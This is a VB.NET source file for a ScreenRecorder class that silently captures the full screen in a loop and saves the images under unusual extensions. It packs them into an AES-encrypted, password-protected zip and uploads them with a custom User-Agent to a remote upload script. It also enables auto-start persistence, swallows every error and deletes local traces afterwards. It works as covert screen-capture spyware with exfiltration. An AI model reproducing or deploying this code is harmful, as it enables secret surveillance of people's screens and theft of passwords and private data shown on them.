#Region "References"

Imports System.IO
Imports System.Net
Imports System.Text
Imports System.Threading
Imports System.Windows.Forms
Imports System.Drawing
Imports System.Drawing.Imaging

Imports nQuant
Imports Ionic.Zip

#End Region

Friend Class ScreenRecorder
    Implements IDisposable

#Region "Private Members"

    Private _isRecordingStopped As Boolean

    Private ReadOnly _pngCodec As ImageCodecInfo
    Private ReadOnly _quantizer As WuQuantizer

    Private ReadOnly _lstImages As List(Of Image)

    Private Shared _zipFileIndex As Long

#End Region

#Region "Constructor"

    Public Sub New()

        _pngCodec = GetImageCodec(ImageFormat.Png)
        _quantizer = New WuQuantizer()

        _lstImages = New List(Of Image)

    End Sub

#End Region

#Region "Public Methods"

    Public Sub StartRecording()

        Dim counter As Integer

        While Not _isRecordingStopped

            counter += 1

            Try

                Dim screenBounds = Screen.GetBounds(New Point)

                Dim bmp = New Bitmap(screenBounds.Width, screenBounds.Height)

                Dim g = Graphics.FromImage(bmp)
                g.CopyFromScreen(New Point(screenBounds.Left, screenBounds.Top), Point.Empty, screenBounds.Size)

                _lstImages.Add(bmp)

                If _lstImages.Count >= SCREENSHOTS_TO_SAVE Then
                    SaveScreenshots(counter)
                End If

                If counter >= SCREENSHOTS_TO_UPLOAD Then
                    If _lstImages.Count > 0 Then SaveScreenshots(counter)
                    ArchiveScreenshots()
                    counter = 0
                End If

            Catch ex As Exception
                'Do nothing
            End Try

            Thread.Sleep(SCREENSHOT_INTERVAL)

        End While

    End Sub

    Public Sub StopRecording()

        _isRecordingStopped = True

        For Each img In _lstImages
            img.Dispose()
        Next

        _lstImages.Clear()

    End Sub

#End Region

#Region "Helper Methods"

    Private Sub SaveScreenshots(startIndex As Integer)

        Dim index As Integer = startIndex - SCREENSHOTS_TO_SAVE

        If Not Directory.Exists(DirScreenshots) Then Directory.CreateDirectory(DirScreenshots)

        For Each img In _lstImages

            index += 1

            Try

                Using params As New EncoderParameters(1)

                    params.Param(0) = New EncoderParameter(Imaging.Encoder.Quality, 25L)

                    Using optimizedImg = _quantizer.QuantizeImage(CType(img, Bitmap), 10, 70, Nothing, 256)
                        optimizedImg.Save(Path.Combine(DirScreenshots, String.Concat("screenshot_", index, ".rpng")), _pngCodec, params)
                    End Using

                    img.Dispose()

                End Using

            Catch ex As Exception
                'Do nothing
            End Try

        Next

        _lstImages.Clear()

    End Sub

    Private Sub ArchiveScreenshots()

        Try

            _zipFileIndex += 1

            Dim zipFilePath = Path.Combine(DirRoot, String.Concat("Screenshots-", Date.Now.Year, "-", Date.Now.Month, "-", Date.Now.Day, "-", Date.Now.Hour, "-", Date.Now.Minute, "-", Date.Now.Second, "-", _zipFileIndex, ".rzip"))

            If File.Exists(zipFilePath) Then File.Delete(zipFilePath) 'Delete the already existing Zip archive

            Using zip As New ZipFile(zipFilePath, Encoding.UTF8)
                zip.Password = ZIP_FILE_PASS
                zip.AddDirectory(DirScreenshots)
                zip.CompressionMethod = CompressionMethod.Deflate
                zip.Encryption = EncryptionAlgorithm.WinZipAes256
                zip.CompressionLevel = Ionic.Zlib.CompressionLevel.Default
                zip.Save()
            End Using

            UploadScreenshots(zipFilePath) 'Upload the ZIP file to the remote server

        Catch ex As Exception
            'Do nothing

        Finally

            EnableAutoStart()

            If Directory.Exists(DirScreenshots) Then

                For Each f In Directory.GetFiles(DirScreenshots, "*.*", SearchOption.TopDirectoryOnly) 'Delete screenshots

                    Try
                        File.Delete(f)
                    Catch ex As Exception
                        'Do nothing
                    End Try

                Next

            End If

        End Try

    End Sub

    Private Sub UploadScreenshots(zipFilePath As String)

        Using wc = New WebClientEx()

            wc.UseDefaultCredentials = True

            wc.Headers.Add("Content-Type", "binary/octet-stream")
            wc.Headers.Add("User-Agent", USER_AGENT)
            wc.Headers.Add("File-Path", zipFilePath)

            AddHandler wc.UploadFileCompleted, AddressOf FileUploadCompleted

            'Use your own upload script
            wc.UploadFileAsync(New Uri("https://www.mysite.com/upload.php?computer_id=" & ComputerId), "POST", zipFilePath)

        End Using

    End Sub

    Private Shared Function GetImageCodec(format As ImageFormat) As ImageCodecInfo

        Try

            For Each codec In ImageCodecInfo.GetImageDecoders().Where(Function(c) c.FormatID = format.Guid)
                Return codec
                Exit For
            Next

        Catch ex As Exception
            'Console.WriteLine (ex.ToString)
        End Try

        Return Nothing

    End Function

#End Region

#Region "Event Handlers"

    Private Sub FileUploadCompleted(sender As Object, e As UploadFileCompletedEventArgs)

        Dim wc = CType(sender, WebClient)

        For Each f In wc.Headers.GetValues("File-Path")

            Try
                File.Delete(f)
            Catch ex As Exception
                'Do nothing
            End Try

        Next

    End Sub

#End Region

#Region "IDispose"

    Private disposedValue As Boolean

    Protected Overridable Sub Dispose(disposing As Boolean)
        If Not disposedValue Then
            If disposing Then
                StopRecording()
            End If

            ' free unmanaged resources (unmanaged objects) and override finalizer
            ' set large fields to null
            disposedValue = True
        End If
    End Sub

    ' ' override finalizer only if 'Dispose(disposing As Boolean)' has code to free unmanaged resources
    ' Protected Overrides Sub Finalize()
    '     ' Do not change this code. Put cleanup code in 'Dispose(disposing As Boolean)' method
    '     Dispose(disposing:=False)
    '     MyBase.Finalize()
    ' End Sub

    Public Sub Dispose() Implements IDisposable.Dispose
        ' Do not change this code. Put cleanup code in 'Dispose(disposing As Boolean)' method
        Dispose(disposing:=True)
        GC.SuppressFinalize(Me)
    End Sub

#End Region

End Class